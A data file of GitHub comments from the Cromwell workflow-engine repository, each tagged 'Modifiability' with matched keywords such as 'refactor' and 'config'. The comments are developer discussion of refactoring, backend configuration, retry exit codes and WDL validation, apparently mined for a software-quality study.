Modifiability,"@cjllanwarne Checkout out #199, a PR into this PR. It refactors `DataAccess`, `Backend`, and `BackendType` around a bit such that the high level workflow manager actor can pass in its data access instance to the backend, OR the various test suites can keep using separate data access instances. . The problem with ""data_access_singleton"" is that the singleton data access seemingly cannot handle the onslaught of our multi-threaded tests. One of our many thread pools around the database seemed to then start returning uncaught(?) errors. Definitely showed some warts in our non-existent load testing... Take a look, decide what you want to keep or jettison, but I do believe that a new database pool / data access should **NOT** be created for each JES `Run`. Otherwise, this branch looks good to go for merge. :+1:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143000894:54,refactor,refactors,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143000894,1,['refactor'],['refactors']
Modifiability,"@cjllanwarne Cool. I don't completely agree with that design, but I'll do it in this PR. Let's see how to evolve it more like what the diagram proposes sometime later.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-196425796:106,evolve,evolve,106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-196425796,1,['evolve'],['evolve']
Modifiability,@cjllanwarne I kinda agree but the problem is when having tools with 100 + arguments that need to be variable by the user the number of passing variable will be do much.; Btw but this the option does work but the naming is just weird ;-),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4079#issuecomment-420553325:101,variab,variable,101,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4079#issuecomment-420553325,2,['variab'],['variable']
Modifiability,"@cjllanwarne I know you just made an update to the IntelliJ plugin, did you fix this too?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2276#issuecomment-330982393:60,plugin,plugin,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2276#issuecomment-330982393,1,['plugin'],['plugin']
Modifiability,"@cjllanwarne I pointed to the wrong line of code, sorry for that. I have identified the bug. The refactoring produced **better** code. The code written before the refactoring created a rc file with exit code `9`(Which was probably a mistake as the comments above the code said that 137 was chosen, for kill -9). `137` for SIGKILL would have been the better value. The current refactored code uses SIGTERM (`143`). This looks nicer, but unfortunately the functionality of the code depended on the choice for `9`. . If cromwell gets SIGINT (`130`) , SIGKILL (`137`) or SIGTERM(`143`) as exit codes for a job, it assumes that cromwell was the one that aborted them and the jobs should NOT be retried. This makes perfect sense. . The refactored code now returns a return code(`143`) that makes cromwell believe that the job should not be retried. My solution would be to write a non-sensical return code in the case exit-timeout-seconds is used. I am working on a pr now. EDIT: This change indeed fixes the problem. PR coming.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4998#issuecomment-496236589:97,refactor,refactoring,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4998#issuecomment-496236589,4,['refactor'],"['refactored', 'refactoring']"
Modifiability,@cjllanwarne I think it's finished now. Meanwhile I detected a bug but did solve this with an other opt-in config value to be able to retry jobs that are aborted. Aborted here means an exitcode above 128 if i read the code correctly. Maybe rename this to ExternalKill instead?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-426991174:107,config,config,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-426991174,1,['config'],['config']
Modifiability,@cjllanwarne I think that should be the second step to do (I was referring previously to that with a data abstraction layer -DAL- implementation) but It may involve a lot of more refactoring since you will need to modify database package to make it generic.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1254#issuecomment-237934228:179,refactor,refactoring,179,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1254#issuecomment-237934228,1,['refactor'],['refactoring']
Modifiability,"@cjllanwarne Indeed different containers might have different requirements, as it will depend on the container what mount points are available. I would like to point out, however, that you can already define this per task using a custom runtime attribute. For example, in my config I could put something like:; ```; runtime-attributes= """"""; String? docker; String? dockerMountPoint = ""/data""; """"""; dockerRoot = ""${dockerMountPoint}""; ```. EDIT: Hmm, nevermind, looks like that wouldn't work. In the submission command, it would, but you'll just end up with `${dockerMountPoint}` in the execution script.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4088#issuecomment-420927684:275,config,config,275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4088#issuecomment-420927684,1,['config'],['config']
Modifiability,"@cjllanwarne On a high level, you can use Intellij to create a new scala project, add the dependencies (wdl4s and cromwell-backend) in the build.sbt from Broad's artefactory repository, copy the JES code folder from develop to this new project, modify the JesBackend to extend from BackendActor, honor the subsequent intellij warnings to implement the abstract methods, and done. The CallActor will control the flow of the backend, going from prepare() -> execute() -> cleanUp() -> stop() etc..",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/401#issuecomment-174085760:270,extend,extend,270,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/401#issuecomment-174085760,1,['extend'],['extend']
Modifiability,"@cjllanwarne Scattering over a map does not work with Cromwell-37. The workflow below doesn't pass wom validation. ```wdl; version 1.0. task add {; input {; Int a; Int b; }; command {}; output {; Int result = a + b; }; }. workflow dict2 {; Map[Int, Float] mIF = {1: 1.2, 10: 113.0}. scatter (p in mIF) {; call add {; input: a=p.left, b=5; }; }. output {; Array[String] result = add.result; }; }; ```. ```bash; $ java -jar womtool-37.jar validate dict2.wdl. Failed to process workflow definition 'dict2' (reason 1 of 1): Invalid type for scatter variable 'p': Map[Int, Float]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3408#issuecomment-463889255:545,variab,variable,545,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3408#issuecomment-463889255,1,['variab'],['variable']
Modifiability,"@cjllanwarne Sorry for the delay in response, I was offline over the Xmas break.; ; > Question: Does the new test actually depend on connecting to external AWS resources? . The short answer is no, it doesn't depend on actually connecting to AWS resources. . However it does require the AWS_REGION environment variable to be set so that the SDK initializes. So if it is run without AWS_REGION the test fails, if it is run with AWS_REGION it works (but doesn't actually connect to AWS). Assuming that your regular CI builds don't set the AWS env variables, it is probably simplest to leave it tagged as an AwsTest.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5216#issuecomment-575101509:309,variab,variable,309,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5216#issuecomment-575101509,2,['variab'],"['variable', 'variables']"
Modifiability,"@cjllanwarne Thanks for notifying! We always use the `docker` attribute in BioWDL, so BioWDL pipelines can run without any extra configuration. On our cluster we have configured this so that we run the docker images using singularity. . I think it is a good thing that custom runtime attributes can be cached now. We recently added a `time_minutes` attribute to our pipelines in order to work better with SLURM. I hope this code ties in nicely when we switch to `hints` in WDL 2.0.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5543#issuecomment-643949996:129,config,configuration,129,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5543#issuecomment-643949996,2,['config'],"['configuration', 'configured']"
Modifiability,"@cjllanwarne The ""causedBy"" nested thing is weird. I'm also not sure how many different formats there are. There's the ""message""; ```; ""failures"": [{; ""message"": ""Task c386672d-0248-4968-9b1a-114f5f5c4706:echo_files failed: error code 5. Message: 8: Failed to pull image ubuntu:latest: \""docker --config /tmp/.docker/ pull ubuntu:latest\"" failed: exit status 1: Pulling repository docker.io/library/ubuntu\nNetwork timed out while trying to connect to https://index.docker.io/v1/repositories/library/ubuntu/images. You may want to check your internet connection or if you are behind a proxy.\n""; }]; ```; and then there's the ""failure"" and timestamp"" :; ```; ""failures"": [{; ""timestamp"": ""2016-08-01T19:58:04.704000Z"",; ""failure"": ""com.google.api.client.googleapis.json.GoogleJsonResponseException: 400 Bad Request\n{\n \""code\"" : 400,\n \""errors\"" : [ {\n \""domain\"" : \""global\"",\n \""message\"" : \""Pipeline 9453747469251135900: Unable to evaluate parameters: %!(EXTRA string=parameter \\\""input_array-0\\\"" has invalid value: bar, baz)\"",\n \""reason\"" : \""badRequest\""\n } ],\n \""message\"" : \""Pipeline 9453747469251135900: Unable to evaluate parameters: %!(EXTRA string=parameter \\\""input_array-0\\\"" has invalid value: bar, baz)\"",\n \""status\"" : \""INVALID_ARGUMENT\""\n}""; }],; ```; and then the caused by: ; ```; ""failures"": [{; ""causedBy"": {; ""causedBy"": {; ""message"": ""connect timed out""; },; ""message"": ""Error getting access token for service account: ""; },; ""message"": ""Failed to upload authentication file""; }]; ```. So, if there are these 3 different ways to show the failures section, I'm not sure if there are more formats that I missed in my cursory examination. My dream is that there would be a consistent format for the failures section that we could reliably programmatically find and display.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2037#issuecomment-282802064:297,config,config,297,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2037#issuecomment-282802064,1,['config'],['config']
Modifiability,"@cjllanwarne Things in this backend long existed before sfs backend came into being, and we didn't look into it yet. Good point though, I think we might try to adapt this to the sfs backend some time in the future.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1403#issuecomment-246858765:160,adapt,adapt,160,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1403#issuecomment-246858765,1,['adapt'],['adapt']
Modifiability,"@cjllanwarne Yes, but for example Workflow store has a dependency on WorkflowStoreSqlDatabase trait, so that means you can not use a NoSQLDatabase impl.; In order to allow WorkflowStore to do that you will need to implement a generic interface to work with different specializations of dbs and for that you will need to define a DAL and perform a bigger refactoring.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1254#issuecomment-237936563:354,refactor,refactoring,354,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1254#issuecomment-237936563,1,['refactor'],['refactoring']
Modifiability,"@cjllanwarne having the docker root be a runtime option as then it's hardcoded to the WDL. . At least for this use case it's not and should not be a WDL concept - the reason it comes up is they are using Singularity for their docker containers, and that's a Cromwell-wide configuration thing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4088#issuecomment-420768761:272,config,configuration,272,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4088#issuecomment-420768761,1,['config'],['configuration']
Modifiability,@cjllanwarne just personal preference. I like how these constructs read. ```; class MyClass extends TypeOfThingClassDoes { }; ```; compared to; ```; import UtilityObject. // many intervening lines of code. class MyClass { }; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6118#issuecomment-738392923:92,extend,extends,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6118#issuecomment-738392923,1,['extend'],['extends']
Modifiability,@cjllanwarne reverted allowSoftLinks flag and keeping configurable docker cmd.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1432#issuecomment-248368192:54,config,configurable,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1432#issuecomment-248368192,1,['config'],['configurable']
Modifiability,"@cjllanwarne sorry, I probably missed that part when I was reviewing the Google doc.; I'm not sure I agree with that approach. Reference bucket names can be configurable via Cromwell configuration file.; I'm not sure there will be more than one official bucket with references in future, but if there will be, we may create different disk images and manifests for different buckets (and each bucket contains it's own manifest file) rather than mixing them all together. This approach would also give us enough flexibility for ""user's own reference buckets/disks use-case"". I envisioned a configuration like this:; ```; backend {; PAPIv2beta {; reference-data-conf {; reference-buckets: [; { broad_official_bucket_name: broad_official_disk_image_locator },; { broad_official_bucket_another_one_name: broad_official_disk_image_another_one_locator },; { users_private_bucket_name: users_private_disk_image_locator }; ]; }; }; }; ```. In this example Cromwell then may check the input file GCS path against the configured list of reference buckets and figure out which image to mount based on that.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5587#issuecomment-664629801:157,config,configurable,157,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5587#issuecomment-664629801,4,['config'],"['configurable', 'configuration', 'configured']"
Modifiability,@cjllanwarne the goal here is to move all backend-specific logic off the `BackendCall` and into the `Backend`. This is an evolutionary step that maintains the same `BackendCall` interface but delegates all meaningful work directly or indirectly to the backend. When this process is complete the `BackendCall` will become useless and methods can become parameterized by `JobDescriptor` instead. The combination of `JobDescriptor` and `Backend` should be able to accomplish any call-level work in the system.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/509#issuecomment-193368423:352,parameteriz,parameterized,352,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/509#issuecomment-193368423,1,['parameteriz'],['parameterized']
Modifiability,"@cjllanwarne this is parameterized, the `JobExecutionTokenDispenserActor` has become `JobTokenDispenserActor` and has [additional constructor parameters](https://github.com/broadinstitute/cromwell/blob/ad1249679a28c297fc1e075b69d2d69619e3b837/engine/src/main/scala/cromwell/engine/workflow/tokens/JobTokenDispenserActor.scala#L27-L28) that allow it to be more generic than before. [Two different instances](https://github.com/broadinstitute/cromwell/blob/ad1249679a28c297fc1e075b69d2d69619e3b837/engine/src/main/scala/cromwell/server/CromwellRootActor.scala#L162-L163) of this same class are created in `CromwellRootActor`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6590#issuecomment-994110935:21,parameteriz,parameterized,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6590#issuecomment-994110935,1,['parameteriz'],['parameterized']
Modifiability,"@cjllanwarne you are totally right, if read/write_json worked it would not be such a pain, I would simple write everything to json, give it to a task with some Scala (or whatever language I want) script that return json and then read it to a cromwell Map. >All WDL values are immutable as an early design choice for the language. I do not mind it, I am used to it in Scala, but in Scala I have powerful filter/map/flatMap/foldLeft are you going to give any of them to WDL?. >You can get something similar by using the implicit gather on a scatter. eg I could map over an array to calculate the ""values plus one"" array like this:. Thanks, I did not know that such thing is possible, I thought that all variables declared inside loops/scatter are not visible from outside",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3305#issuecomment-367449569:701,variab,variables,701,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3305#issuecomment-367449569,1,['variab'],['variables']
Modifiability,"@cjllanwarne, checked works as expected:; ```; 2020-06-04 21:43:38,063 cromwell-system-akka.dispatchers.engine-dispatcher-29 INFO - WorkflowManagerActor WorkflowActor-796f3949-47e6-497e-9458-59ab53a063c6 is in a terminal state: WorkflowSucceededState; 2020-06-04 21:43:43,504 cromwell-system-akka.actor.default-dispatcher-56 ERROR - Carboniting failure: cromwell.services.MetadataTooLargeNumberOfRowsException: Metadata for workflow 796f3949-47e6-497e-9458-59ab53a063c6 exists indatabase, but cannot be served. This is done in order to avoid Cromwell failure: metadata is too large - 283000000 rows, and may cause Cromwell instance to die on attempt to read it in memory. Configured metadata safety limit is 1000000.. Marking as TooLargeToArchive; cromwell.services.MetadataTooLargeNumberOfRowsException: Metadata for workflow 796f3949-47e6-497e-9458-59ab53a063c6 exists indatabase, but cannot be served. This is done in order to avoid Cromwell failure: metadata is too large - 283000000 rows, and may cause Cromwell instance to die on attempt to read it in memory. Configured metadata safety limit is 1000000.; 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor$$anonfun$2.applyOrElse(MetadataBuilderActor.scala:283); 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor$$anonfun$2.applyOrElse(MetadataBuilderActor.scala:267); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:38); 	at akka.actor.FSM.processEvent(FSM.scala:707); 	at akka.actor.FSM.processEvent$(FSM.scala:704); 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor.akka$actor$LoggingFSM$$super$processEvent(MetadataBuilderActor.scala:245); 	at akka.actor.LoggingFSM.processEvent(FSM.scala:847); 	at akka.actor.LoggingFSM.processEvent$(FSM.scala:829); 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor.processEvent(MetadataBuilderActor.scala:245); 	at akka.actor.FSM.akka$actor$FSM$$processMsg(FSM.scala:701); 	at akka.actor.FSM$$anonfun$receive$1.apply",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-639142073:672,Config,Configured,672,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-639142073,1,['Config'],['Configured']
Modifiability,"@cpavanrun If I understood you correctly I think this change will give you what you want, albeit you'll need to opt in to that behavior via configuration",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-424755522:140,config,configuration,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-424755522,1,['config'],['configuration']
Modifiability,@cpavanrun If this is enabled in the config like this it does retry:; https://cromwell.readthedocs.io/en/develop/RuntimeAttributes/#maxretries. Also the timeout will start counting when isAlive returns false for the first time. After that isAlive will not be called anymore.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-425008288:37,config,config,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-425008288,1,['config'],['config']
Modifiability,"@cpavanrun That's a good point, although it looks like the `SCRIPT_PREAMBLE` is not configurable, only overridable in code by backend implementations.; We could make it configurable too (while making sure that backend implementations still get to add their bit), or create a different one for just that purpose",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3721#issuecomment-394686544:84,config,configurable,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3721#issuecomment-394686544,2,['config'],['configurable']
Modifiability,"@danbills @kshakir refactored to reflect the new shape of https://www.lucidchart.com/invitations/accept/495747cc-4eeb-4a49-97c2-5545d2411a93. In brief:. * The decider is outside of the HMSA itself, to preserve responsiveness while deciding ""where do I send this read request""; * There is a new regulator layer between the HMSA and the read decider (so that we only choose once per identical read request)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5171#issuecomment-533183374:19,refactor,refactored,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5171#issuecomment-533183374,1,['refactor'],['refactored']
Modifiability,"@delagoya I can't seem to find the thread, but the pathing reversal from @kshakir's notes above was purposeful. By using /test1/... rather than .../test1, we get the advantage of a more useful host path when traversing manually for debugging purposes for example, or by being able to segment what we know are large tasks to different filesystems. I'm comfortable changing the disks configuration name but this should probably be tracked in a separate issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3744#issuecomment-405687348:382,config,configuration,382,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3744#issuecomment-405687348,1,['config'],['configuration']
Modifiability,@delagoya The plan is to bake this into an AMI similar to the way ecs agent is installed. It will be a container with a always-on restart policy. https://docs.docker.com/config/containers/start-containers-automatically/,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-410858494:170,config,config,170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-410858494,1,['config'],['config']
Modifiability,"@delocalizer ah, thanks. I didn't realize the new backend system was this flexible (the `README` is a little opaque). Thank you for sharing your PBS configuration file! I confirm it works for me, too.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1106#issuecomment-254206921:74,flexible,flexible,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1106#issuecomment-254206921,2,"['config', 'flexible']","['configuration', 'flexible']"
Modifiability,@dfeinzeig for private registries I believe you have to use the Docker CLI as described here: https://cromwell.readthedocs.io/en/stable/tutorials/Containers/#docker-config-block,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3574#issuecomment-788224575:165,config,config-block,165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3574#issuecomment-788224575,1,['config'],['config-block']
Modifiability,"@dgtester just a heads up that I did some refactoring in the area of your recent PR that might at first look like I deleted your work, but actually that logic has been consolidated to `WorkflowManagerActor`. I've tested that SIGINT still works in both ""run"" and ""server"" use cases, but please let me know if you have any questions or concerns.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/413#issuecomment-178247776:42,refactor,refactoring,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/413#issuecomment-178247776,1,['refactor'],['refactoring']
Modifiability,"@dirkpetersen For the record, the next version of SMRT Link will have the modified Cromwell config too.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5402#issuecomment-585341098:92,config,config,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5402#issuecomment-585341098,1,['config'],['config']
Modifiability,"@djhshih I don't think it fully explains it, but the path to the localization strategies in the config file has changed.; `-Dbackend.shared-filesystem.localization.0=soft-link` won't have any effect.; Each backend now has its own `config` stanza. For local backend that would be ; `-Dbackend.providers.Local.config.filesystems.local.localization.0=soft-link`; Could you try with that and see if you have the same problem ?; I'm still confused as why some of them are soft-linked and some of them aren't. I think logging when a localization strategy fails would also be a good idea.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1072#issuecomment-230903835:96,config,config,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1072#issuecomment-230903835,3,['config'],['config']
Modifiability,@dshiga: @ruchim talked to myself and @samanehsan today about whether it would be ok for this to be implemented as a runtime attribute that could be configured per task and we thought that would be ok. It is the way they prefer to implement it.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3161#issuecomment-379321032:149,config,configured,149,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3161#issuecomment-379321032,1,['config'],['configured']
Modifiability,"@dtenenba , @geoffjentry - the `aws.region` in the `cromwell.conf` file needs to be set. Ideally, it should use settings from `~/.aws/config` for ""default"", but that is not the case. It will pick up the default credentials though. From a CloudFormation standpoint, when creating a Cromwell server, the region is set in the config using a pseudo parameter. See [this line](https://github.com/aws-samples/aws-genomics-workflows/blob/0c119b14131468f9fd8007332ba74e3319bf3d2d/src/templates/cromwell/cromwell-server.template.yaml#L281). This well be whatever region you launched the template in. For AZs, those are effectively defined when the Batch Compute Environment is created (they are the subnets you specify, which should match up to AZs you created with the associated VPC.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493306888:134,config,config,134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493306888,2,['config'],['config']
Modifiability,"@dtenenba , @vortexing - The [docs](https://docs.opendata.aws/genomics-workflows) for creating the genomics workflow environment (i.e. AWS Batch and related resources) have been updated. Use of custom AMIs has been deprecated in favor of using EC2 Launch Templates. There's also additional parameter validation under the hood around setting up an environment for Cromwell to avoid these configuration errors.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-470339885:387,config,configuration,387,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-470339885,1,['config'],['configuration']
Modifiability,"@dtenenba - the space on the scratch mount point (for cromwell it is `/cormwell_root`) is managed by a monitoring tool `ebs-autoscale` that is installed when creating a custom AMI configured for Cromwell, and then referencing that AMI when creating Batch compute environments. Running out of space points to one or more of the following:. * the monitor is not installed; * the monitor is looking at the wrong location in the filesystem. If you've created a custom AMI, I suggest launching an instance with it and checking that the monitor is watching the correct location. Do this by checking the log: `/var/log/ebs-autoscale.log`. If it's not, you'll need to recreate both the AMI and the Batch Compute Environment, and associate the new CE with your Job Queue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-468794942:180,config,configured,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-468794942,1,['config'],['configured']
Modifiability,"@dtenenba It's possible the cloudformation templates do some magic to pull the value (@wleepang ?) . There are a couple of places you can specify this:. - Your cromwell config file(s): The field `backend.providers.YOURBATCHBACKENDNAME.config.default-runtime-attributes`; - The workflow options JSON file, field name `default-runtime-attributes`; - The `zones` field as you suggested above. You can see an example [here](https://cromwell.readthedocs.io/en/develop/RuntimeAttributes/#zones)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493265705:169,config,config,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493265705,2,['config'],['config']
Modifiability,"@elerch ; 1) changed to `region`; 2) agree w/ approach. I'm going to make the config be an Option[Region], then if none will omit the `region()` builder call",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4228#issuecomment-429019512:78,config,config,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4228#issuecomment-429019512,1,['config'],['config']
Modifiability,"@ernoc Can you provide some more info on your setup? What backend you're using, what DB configuration, etc.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2450#issuecomment-423360617:88,config,configuration,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2450#issuecomment-423360617,1,['config'],['configuration']
Modifiability,"@ernoc So this sounds like there's a disconnect between the status changing in memory and getting updated in the db (as the REST endpoints report status from the db). . 1. Do you see anything in your logs that indicate db errors?; 2. What does your db config look like? ; 3. When you report the REST endpoint shows the workflow as 'Running', what about the `executionStatus` key in the metadata? Are some jobs marked as 'Running' as well?; 4. Do you see this behavior only with large scatters (10K) or do you see it with smaller scatters as well? Or any other type of workflow shape?. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-445245400:252,config,config,252,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-445245400,1,['config'],['config']
Modifiability,"@ffinfo As I read it:. - If state is `None`, go to `Running` state; - If state is `Running`, the first thing we do is run `isAlive` (which I don't want to ever do!). That means that I have no way to opt-out of ever running `isAlive` (which is the thing I want before approving this PR). ---. What I was suggesting is (but there are many other ways):; - If I set `pollForAliveness: ""1 minute""` in the config file:; - Use `context.system.scheduler.scheduleOnce` to run an `isAlive` 1 minute in the future (completely separate from `pollStatus`).; - If that `isAlive` is true, schedule again another 1 minute in the future; - If not, record the time at which the job was not alive; - `pollStatus` continues on a different schedule:; - If the job is no longer alive, the `pollStatus` switches to `WaitingForReturnCode`; - If a time limit is set for the `WaitingForReturnCode` state, honor it; - If I set `pollForAliveness: false` in the config file:; - Go straight to `WaitingForReturnCode`; - No time limits for `WaitingForReturnCode`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-424371053:400,config,config,400,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-424371053,2,['config'],['config']
Modifiability,"@ffinfo Hi Peter - apologies for taking so long, the release I mentioned ended up taking a while longer than we thought. I talked to our PO this morning about this pull request and his take was that if this could be hooked up in a way which keeps the tests green (as much as they ever are) and doesn't add noticeable latency in the system for other users (and/or the behavior change is put behind a config option) that he'd be good with this concept. . It's been a month now so it's entirely possible you've already moved on with life or perhaps you have no interest for other reasons so I'll leave it up to you on how to proceed",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-249220442:399,config,config,399,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-249220442,1,['config'],['config']
